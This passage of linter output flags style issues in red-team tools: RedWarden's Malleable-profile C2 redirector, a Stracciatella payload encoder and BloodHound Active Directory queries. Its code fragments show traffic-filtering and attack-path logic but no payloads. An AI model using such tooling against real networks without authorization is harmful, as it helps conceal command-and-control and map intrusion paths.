     |                              ^^^^^^^^^^^^^^^^^^^
2346 |                             if uri.startswith(_uri):
2347 |                                 found = True
     |
help: Replace with `not exactmatch`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2352:25
     |
2350 |                   if not found:
2351 |                       self.drop_reason(
2352 | /                         '[DROP, {}, reason:11b, {}] Requested URI does not align any of Malleable defined variants: "{}"'.format(
2353 | |                             ts, peerIP, req.uri
2354 | |                         )
     | |_________________________^
2355 |                       )
2356 |                       reason = "11b"
     |
help: Convert to f-string

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2361:21
     |
2359 |             if section.lower() == "http-stager" and (
2360 |                 (
2361 |                     "uri_x64" in configblock.keys()
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2362 |                     and malleable_meta["uri"] == configblock["uri_x64"]
2363 |                 )
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2365:21
     |
2363 |                 )
2364 |                 or (
2365 |                     "uri_x86" in configblock.keys()
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2366 |                     and malleable_meta["uri"] == configblock["uri_x86"]
2367 |                 )
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2370:21
     |
2368 |             ):
2369 |                 if (
2370 |                     "host_stage" in self.malleable.config.keys()
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2371 |                     and self.malleable.config["host_stage"] == "false"
2372 |                 ):
     |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2374:25
     |
2372 |   ΓÇª     ):
2373 |   ΓÇª         self.drop_reason(
2374 | / ΓÇª             '[DROP, {}, reason:11c, {}] Requested URI refers to http-stager section however Payload staging was disabled: "{}"'.foΓÇª
2375 | | ΓÇª                 ts, peerIP, req.uri
2376 | | ΓÇª             )
     | |_______________^
2377 |   ΓÇª         )
2378 |   ΓÇª         reason = "11c"
     |
help: Convert to f-string

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2383:20
     |
2381 |             hdrs2 = {}
2382 |
2383 |             if not "header" in configblock["client"].keys():
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2384 |                 configblock["client"]["header"] = []
     |
help: Remove `.keys()`

E713 [*] Test for membership should be `not in`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2383:20
     |
2381 |             hdrs2 = {}
2382 |
2383 |             if not "header" in configblock["client"].keys():
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2384 |                 configblock["client"]["header"] = []
     |
help: Convert to `not in`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2389:20
     |
2387 |                 hdrs2[h[0].lower()] = h[1]
2388 |
2389 |             if not "parameter" in configblock["client"].keys():
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2390 |                 configblock["client"]["parameter"] = []
     |
help: Remove `.keys()`

E713 [*] Test for membership should be `not in`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2389:20
     |
2387 |                 hdrs2[h[0].lower()] = h[1]
2388 |
2389 |             if not "parameter" in configblock["client"].keys():
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2390 |                 configblock["client"]["parameter"] = []
     |
help: Convert to `not in`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2396:17
     |
2395 |             if (
2396 |                 "useragent" in self.malleable.config.keys()
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2397 |                 and len(self.malleable.config["useragent"]) > 0
2398 |             ):
     |
help: Remove `.keys()`

N806 Variable `userAgentValue` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2403:13
     |
2401 |                 hdrs2["user-agent"] = MalleableParser.GlobalOptionsDefaults["useragent"]
2402 |
2403 |             userAgentValue = req.headers.get("User-Agent")
     |             ^^^^^^^^^^^^^^
2404 |
2405 |             if (
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2406:17
     |
2405 |             if (
2406 |                 "protect_these_headers_from_tampering" in self.proxyOptions.keys()
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2407 |                 and len(self.proxyOptions["protect_these_headers_from_tampering"]) > 0
2408 |                 and "user-agent"
     |
help: Remove `.keys()`

N806 Variable `oldUserAgent` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2415:17
     |
2413 |             ):
2414 |
2415 |                 oldUserAgent = req.headers.get("User-Agent")
     |                 ^^^^^^^^^^^^
2416 |                 expectedUserAgent = hdrs2["user-agent"]
     |

N806 Variable `expectedUserAgent` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2416:17
     |
2415 |                 oldUserAgent = req.headers.get("User-Agent")
2416 |                 expectedUserAgent = hdrs2["user-agent"]
     |                 ^^^^^^^^^^^^^^^^^
2417 |
2418 |                 if oldUserAgent != expectedUserAgent:
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2420:25
     |
2418 |   ΓÇª     if oldUserAgent != expectedUserAgent:
2419 |   ΓÇª         self.logger.dbg(
2420 | / ΓÇª             "Inbound request had User-Agent ({}) however ({}) was expected. Since this header was marked for protection - restorinΓÇª
2421 | | ΓÇª                 oldUserAgent, expectedUserAgent
2422 | | ΓÇª             )
     | |_______________^
2423 |   ΓÇª         )
     |
help: Convert to f-string

N806 Variable `userAgentValue` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2427:21
     |
2425 |                     del req.headers["User-Agent"]
2426 |                     req.headers["User-Agent"] = expectedUserAgent
2427 |                     userAgentValue = expectedUserAgent
     |                     ^^^^^^^^^^^^^^
2428 |
2429 |             # User-agent conformancy
     |

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2430:34
     |
2429 |             # User-agent conformancy
2430 |             if self.malleable != None:
     |                                  ^^^^
2431 |                 if len(self.malleable.config["useragent"]) > 0:
2432 |                     if (
     |
help: Replace with `cond is not None`

E712 Avoid equality comparisons to `True`; use `ret:` for truth checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2448:28
     |
2446 |                             True, ts, peerIP, req.uri, userAgentValue, "1"
2447 |                         )
2448 |                         if ret == True:
     |                            ^^^^^^^^^^^
2449 |                             return (True, "1")
2450 |                         else:
     |
help: Replace with `ret`

E712 Avoid equality comparisons to `True`; use `ret:` for truth checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2472:28
     |
2470 |                             True, ts, peerIP, req.uri, userAgentValue, "0"
2471 |                         )
2472 |                         if ret == True:
     |                            ^^^^^^^^^^^
2473 |                             return (True, "0")
2474 |                         else:
     |
help: Replace with `ret`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2488:25
     |
2487 |                       if (
2488 | /                         "protect_these_headers_from_tampering"
2489 | |                         in self.proxyOptions.keys()
     | |___________________________________________________^
2490 |                           and len(
2491 |                               self.proxyOptions["protect_these_headers_from_tampering"]
     |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2504:29
     |
2503 |   ΓÇª     self.logger.dbg(
2504 | / ΓÇª         "Inbound request did not contain expected by Malleable profile HTTP header named: {} . Restoring it to expected value as iΓÇª
2505 | | ΓÇª             k
2506 | | ΓÇª         )
     | |___________^
2507 |   ΓÇª     )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2512:29
     |
2510 |                       else:
2511 |                           self.drop_reason(
2512 | /                             '[DROP, {}, reason:5, {}] HTTP request did not contain expected header: "{}"'.format(
2513 | |                                 ts, peerIP, k
2514 | |                             )
     | |_____________________________^
2515 |                           )
2516 |                           reason = "5"
     |
help: Convert to f-string

F405 `proxy2_metadata_headers` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2534:37
     |
2532 |                         # del req.headers['Host']
2533 |                         # req.headers['Host'] = v
2534 |                         req.headers[proxy2_metadata_headers["override_host_header"]] = v
     |                                     ^^^^^^^^^^^^^^^^^^^^^^^
2535 |
2536 |                     if not ret:
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2538:29
     |
2536 |                       if not ret:
2537 |                           if (
2538 | /                             "protect_these_headers_from_tampering"
2539 | |                             in self.proxyOptions.keys()
     | |_______________________________________________________^
2540 |                               and len(
2541 |                                   self.proxyOptions[
     |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2556:33
     |
2555 |   ΓÇª     self.logger.dbg(
2556 | / ΓÇª         "Inbound request had HTTP Header ({})=({}) however ({}) was expected. Since this header was marked for protection - restorΓÇª
2557 | | ΓÇª             k, req.headers[k], hdrs2[k.lower()]
2558 | | ΓÇª         )
     | |___________^
2559 |   ΓÇª     )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2566:33
     |
2564 |                           else:
2565 |                               self.drop_reason(
2566 | /                                 '[DROP, {}, reason:6, {}] HTTP request did not contain expected header value: "{}: {}"'.format(
2567 | |                                     ts, peerIP, k, v
2568 | |                                 )
     | |_________________________________^
2569 |                               )
2570 |                               reason = "6"
     |
help: Convert to f-string

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2579:21
     |
2578 |                 if (
2579 |                     k not in out.keys()
     |                     ^^^^^^^^^^^^^^^^^^^
2580 |                     and self.proxyOptions["policy"][
2581 |                         "drop_malleable_without_request_section_in_uri"
     |
help: Remove `.keys()`

F405 `metadata` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2586:49
     |
2584 | ΓÇª     self.drop_reason(
2585 | ΓÇª         '[DROP, {}, reason:8, {}] HTTP request was expected to contain {} section with parameter in URI: "{}"'.format(
2586 | ΓÇª             ts, peerIP, _block, metadata["parameter"]
     |                                   ^^^^^^^^
2587 | ΓÇª         )
2588 | ΓÇª     )
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2600:25
     |
2598 |                       ret = True
2599 |                       self.drop_reason(
2600 | /                         '[DROP, {}, reason:6, {}] HTTP request did not contain expected uri value: "{}: {}"'.format(
2601 | |                             ts, peerIP, k, v
2602 | |                         )
     | |_________________________^
2603 |                       )
2604 |                       reason = "6"
     |
help: Convert to f-string

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2608:20
     |
2607 |             for _block in foundblocks:
2608 |                 if _block in configblock["client"].keys():
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2609 |                     metadata = configblock["client"][_block]
2610 |                     metadatacontainer = ""
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2612:24
     |
2610 |                     metadatacontainer = ""
2611 |
2612 |                     if "header" in metadata.keys():
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^
2613 |                         if (
2614 |                             metadata["header"].lower() not in rehdrskeys
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2635:26
     |
2633 |                             ]
2634 |
2635 |                     elif "parameter" in metadata.keys():
     |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2636 |                         out = parse_qs(urlsplit(req.uri).query)
     |
help: Remove `.keys()`

F841 Local variable `paramname` is assigned to but never used
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2638:25
     |
2636 |                         out = parse_qs(urlsplit(req.uri).query)
2637 |
2638 |                         paramname = metadata["parameter"]
     |                         ^^^^^^^^^
2639 |                         if (
2640 |                             metadata["parameter"] not in out.keys()
     |
help: Remove assignment to unused variable `paramname`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2640:29
     |
2638 |                         paramname = metadata["parameter"]
2639 |                         if (
2640 |                             metadata["parameter"] not in out.keys()
     |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2641 |                             and self.proxyOptions["policy"][
2642 |                                 "drop_malleable_without_request_section_in_uri"
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2658:26
     |
2656 |                         ]
2657 |
2658 |                     elif "uri-append" in metadata.keys():
     |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2659 |                         if not self.proxyOptions["policy"][
2660 |                             "drop_malleable_with_invalid_uri_append"
     |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2669:37
     |
2667 |                         metadatacontainer = req.uri
2668 |
2669 |                     self.logger.dbg("Metadata container: {}".format(metadatacontainer))
     |                                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2670 |
2671 |                     if "prepend" in metadata.keys():
     |
help: Convert to f-string

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2671:24
     |
2669 |                     self.logger.dbg("Metadata container: {}".format(metadatacontainer))
2670 |
2671 |                     if "prepend" in metadata.keys():
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2672 |                         if type(metadata["prepend"]) == list:
2673 |                             for p in metadata["prepend"]:
     |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2672:28
     |
2671 |                     if "prepend" in metadata.keys():
2672 |                         if type(metadata["prepend"]) == list:
     |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2673 |                             for p in metadata["prepend"]:
2674 |                                 if (
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2681:41
     |
2679 |   ΓÇª                     ):
2680 |   ΓÇª                         self.drop_reason(
2681 | / ΓÇª                             '[DROP, {}, reason:9, {}] Did not found prepend pattern: "{}"'.format(
2682 | | ΓÇª                                 ts, peerIP, p
2683 | | ΓÇª                             )
     | |_______________________________^
2684 |   ΓÇª                         )
2685 |   ΓÇª                         if len(metadata["prepend"]) > 1:
     |
help: Convert to f-string

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2692:25
     |
2690 |                                       return (True, reason)
2691 |
2692 | /                         elif type(metadata["prepend"]) == str:
2693 | |                             if (
2694 | |                                 metadata["prepend"] not in metadatacontainer
2695 | |                                 and self.proxyOptions["policy"][
2696 | |                                     "drop_malleable_without_prepend_pattern"
2697 | |                                 ]
2698 | |                             ):
     | |______________________________^
2699 |                                   self.drop_reason(
2700 |                                       '[DROP, {}, reason:9, {}] Did not found prepend pattern: "{}"'.format(
     |
help: Combine `if` statements using `and`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2692:30
     |
2690 |                                     return (True, reason)
2691 |
2692 |                         elif type(metadata["prepend"]) == str:
     |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2693 |                             if (
2694 |                                 metadata["prepend"] not in metadatacontainer
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2711:24
     |
2709 |                                 return (True, reason)
2710 |
2711 |                     if "append" in metadata.keys():
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^
2712 |                         if type(metadata["append"]) == list:
2713 |                             for p in metadata["append"]:
     |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2712:28
     |
2711 |                     if "append" in metadata.keys():
2712 |                         if type(metadata["append"]) == list:
     |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2713 |                             for p in metadata["append"]:
2714 |                                 if (
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2721:41
     |
2719 |   ΓÇª                     ):
2720 |   ΓÇª                         self.drop_reason(
2721 | / ΓÇª                             '[DROP, {}, reason:10, {}] Did not found append pattern: "{}"'.format(
2722 | | ΓÇª                                 ts, peerIP, p
2723 | | ΓÇª                             )
     | |_______________________________^
2724 |   ΓÇª                         )
2725 |   ΓÇª                         if len(metadata["append"]) > 1:
     |
help: Convert to f-string

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2732:25
     |
2730 |                                       return (True, reason)
2731 |
2732 | /                         elif type(metadata["append"]) == str:
2733 | |                             if (
2734 | |                                 metadata["append"] not in metadatacontainer
2735 | |                                 and self.proxyOptions["policy"][
2736 | |                                     "drop_malleable_without_apppend_pattern"
2737 | |                                 ]
2738 | |                             ):
     | |______________________________^
2739 |                                   self.drop_reason(
2740 |                                       '[DROP, {}, reason:10, {}] Did not found append pattern: "{}"'.format(
     |
help: Combine `if` statements using `and`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2732:30
     |
2730 |                                     return (True, reason)
2731 |
2732 |                         elif type(metadata["append"]) == str:
     |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2733 |                             if (
2734 |                                 metadata["append"] not in metadatacontainer
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2753:17
     |
2751 |           else:
2752 |               self.logger.err(
2753 | /                 "_client_request_inspect: No section ({}) or variant ({}) specified or ones provided are invalid!".format(
2754 | |                     section, variant
2755 | |                 )
     | |_________________^
2756 |               )
2757 |               return (True, "11")
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2760:13
     |
2759 |         self.logger.dbg(
2760 |             "[{}: ALLOW] Peer's request is accepted".format(peerIP), color="green"
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2761 |         )
2762 |         reason = "0"
     |
help: Convert to f-string

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2767:13
     |
2765 |     def checkIfHiddenAPICall(self, req, req_body):
2766 |         if (
2767 |             "malleable_redirector_hidden_api_endpoint" in self.proxyOptions.keys()
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2768 |             and len(self.proxyOptions["malleable_redirector_hidden_api_endpoint"])
2769 |         ):
     |
help: Remove `.keys()`

N806 Variable `urlMatch` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2771:13
     |
2769 |         ):
2770 |
2771 |             urlMatch = (
     |             ^^^^^^^^
2772 |                 req.uri == self.proxyOptions["malleable_redirector_hidden_api_endpoint"]
2773 |             )
     |

N806 Variable `methodMatch` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2774:13
     |
2772 |                 req.uri == self.proxyOptions["malleable_redirector_hidden_api_endpoint"]
2773 |             )
2774 |             methodMatch = req.method.lower() == "post"
     |             ^^^^^^^^^^^
2775 |
2776 |             if not urlMatch or not methodMatch:
     |

N806 Variable `bodyJson` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2779:13
     |
2777 |                 return (False, None)
2778 |
2779 |             bodyJson = ""
     |             ^^^^^^^^
2780 |             bodyValid = False
2781 |             try:
     |

N806 Variable `bodyValid` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2780:13
     |
2779 |             bodyJson = ""
2780 |             bodyValid = False
     |             ^^^^^^^^^
2781 |             try:
2782 |                 bodyJson = json.loads(req_body)
     |

N806 Variable `bodyJson` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2782:17
     |
2780 |             bodyValid = False
2781 |             try:
2782 |                 bodyJson = json.loads(req_body)
     |                 ^^^^^^^^
2783 |
2784 |                 if not ("peerIP" in bodyJson.keys() and len(bodyJson["peerIP"]) > 0):
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2784:25
     |
2782 |                 bodyJson = json.loads(req_body)
2783 |
2784 |                 if not ("peerIP" in bodyJson.keys() and len(bodyJson["peerIP"]) > 0):
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
2785 |                     if "headers" in bodyJson.keys() and len(bodyJson["headers"]) > 0:
2786 |                         ProxyPlugin.get_mock_req(
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2785:24
     |
2784 |                 if not ("peerIP" in bodyJson.keys() and len(bodyJson["peerIP"]) > 0):
2785 |                     if "headers" in bodyJson.keys() and len(bodyJson["headers"]) > 0:
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2786 |                         ProxyPlugin.get_mock_req(
2787 |                             "0.0.0.0", req.method, req.uri, bodyJson["headers"]
     |
help: Remove `.keys()`

N806 Variable `bodyValid` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2790:25
     |
2788 |                         )
2789 |                         bodyJson["peerIP"] = ProxyPlugin.get_peer_ip(req)
2790 |                         bodyValid = True
     |                         ^^^^^^^^^
2791 |                 else:
2792 |                     bodyValid = True
     |

N806 Variable `bodyValid` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2792:21
     |
2790 |                         bodyValid = True
2791 |                 else:
2792 |                     bodyValid = True
     |                     ^^^^^^^^^
2793 |
2794 |             except Exception as e:
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2804:21
     |
2802 |               else:
2803 |                   self.logger.err(
2804 | /                     "Request only resembled Hidden API call but didn't go through closer inspection ({}, {}, {})".format(
2805 | |                         urlMatch, methodMatch, bodyValid
2806 | |                     )
     | |_____________________^
2807 |                   )
     |
help: Convert to f-string

N803 Argument name `jsonParsed` should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2811:47
     |
2809 |         return (False, None)
2810 |
2811 |     def prepareResponseForHiddenAPICall(self, jsonParsed, req, req_body, res, res_body):
     |                                               ^^^^^^^^^^
2812 |         out = ""
2813 |         respJson = {}
     |

N806 Variable `respJson` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2813:9
     |
2811 |     def prepareResponseForHiddenAPICall(self, jsonParsed, req, req_body, res, res_body):
2812 |         out = ""
2813 |         respJson = {}
     |         ^^^^^^^^
2814 |
2815 |         if jsonParsed["peerIP"] == "0.0.0.0":
     |

N806 Variable `respJson` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2816:13
     |
2815 |         if jsonParsed["peerIP"] == "0.0.0.0":
2816 |             respJson = {
     |             ^^^^^^^^
2817 |                 "error": "1",
2818 |                 "message": "Could not extract peerIP from neither JSON nor HTTP headers!",
     |

N806 Variable `respJson` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2833:13
     |
2831 |             )
2832 |
2833 |             respJson = outresult
     |             ^^^^^^^^
2834 |             res.status = 200
2835 |             res.reason = "OK"
     |

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2844:12
     |
2842 |         }
2843 |
2844 |         if "ipgeo" not in respJson.keys():
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2845 |             respJson["ipgeo"] = {}
2846 |         respJson["peerIP"] = jsonParsed["peerIP"]
     |
help: Remove `.keys()`

N806 Variable `peerIP` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:2851:9
     |
2849 |         self.logger.dbg(f"Returning response for a hidden API call:\n{out}")
2850 |
2851 |         peerIP = req.client_address[0]
     |         ^^^^^^
2852 |
2853 |         self.logger.info(
     |

E722 Do not use bare `except`
  --> security\penetration-testing-tools\red-teaming\Stracciatella\encoder.py:52:5
   |
50 |         if opts.xor:
51 |             config["xorkey"] = int(opts.xor, 16)
52 |     except:
   |     ^^^^^^
53 |         print("[-] Incorrect xor key number format. Must be in Hex.")
54 |         sys.exit(1)
   |

E722 Do not use bare `except`
  --> security\penetration-testing-tools\red-teaming\Stracciatella\encoder.py:76:5
   |
74 |             with open(my_file, "rb") as f:
75 |                 return f.read()
76 |     except:
   |     ^^^^^^
77 |         pass
   |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\Stracciatella\encoder.py:109:15
    |
107 |             f.write(out)
108 |
109 |         print("[+] Written {} bytes to: {}".format(len(out), opts.output))
    |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
110 |     else:
111 |         sys.stdout.write(out.decode())
    |
help: Convert to f-string

F401 [*] `math` imported but unused
  --> security\penetration-testing-tools\red-teaming\bloodhound\getOutboundControlled.py:10:8
   |
 8 | #
 9 |
10 | import math
   |        ^^^^
11 | import os
12 | import sys
   |
help: Remove unused import: `math`

N816 Variable `nodesToCheckPerStep` in global scope should not be mixedCase
  --> security\penetration-testing-tools\red-teaming\bloodhound\getOutboundControlled.py:39:1
   |
37 | #
38 |
39 | nodesToCheckPerStep = 10
   | ^^^^^^^^^^^^^^^^^^^
40 |
41 | columns1 = "name,outbound_first_degree"
   |

W291 Trailing whitespace
  --> security\penetration-testing-tools\red-teaming\bloodhound\getOutboundControlled.py:46:54
   |
44 | query_first_degree_outbound = """
45 | MATCH p=(u)-[r1]->(n) WHERE r1.isacl=true AND (__CONDITION__)
46 | WITH u.name as name, COUNT(DISTINCT(n)) as controlled 
   |                                                      ^
47 | RETURN name, controlled 
48 | """
   |
help: Remove trailing whitespace

W291 Trailing whitespace
  --> security\penetration-testing-tools\red-teaming\bloodhound\getOutboundControlled.py:47:24
   |
45 | MATCH p=(u)-[r1]->(n) WHERE r1.isacl=true AND (__CONDITION__)
46 | WITH u.name as name, COUNT(DISTINCT(n)) as controlled 
47 | RETURN name, controlled 
   |                        ^
48 | """
   |
help: Remove trailing whitespace

W291 Trailing whitespace
  --> security\penetration-testing-tools\red-teaming\bloodhound\getOutboundControlled.py:53:24
   |
51 | MATCH p=(u)-[r1:MemberOf*1..]->(g:Group)-[r2]->(n) WHERE r2.isacl=true AND (__CONDITION__)
52 | WITH u.name as name, COUNT(DISTINCT(n)) as controlled
53 | RETURN name, controlled 
   |                        ^
54 | """
   |
help: Remove trailing whitespace

N806 Variable `conditionList` in function should be lowercase
  --> security\penetration-testing-tools\red-teaming\bloodhound\getOutboundControlled.py:62:5
   |
60 |     global results
61 |
62 |     conditionList = []
   |     ^^^^^^^^^^^^^
63 |
64 |     for node in nodes:
   |

